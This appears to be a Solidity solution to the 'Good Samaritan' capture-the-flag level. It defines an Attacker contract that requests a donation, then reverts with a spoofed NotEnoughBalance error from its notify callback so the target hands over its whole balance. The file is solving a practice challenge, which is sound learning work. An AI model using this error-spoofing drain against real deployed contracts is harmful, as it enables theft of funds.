// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {IGoodSamaritan} from "src/IGoodSamaritan.sol";

contract Attacker {
    
    IGoodSamaritan target;

    error NotEnoughBalance();

    constructor(address targetAddr) {
        target= IGoodSamaritan(targetAddr);
    }

    function attack() public {
        target.requestDonation();
    }

    function notify(uint256 amount) public pure {
        if (amount <= 10)
            revert NotEnoughBalance();
    }
}
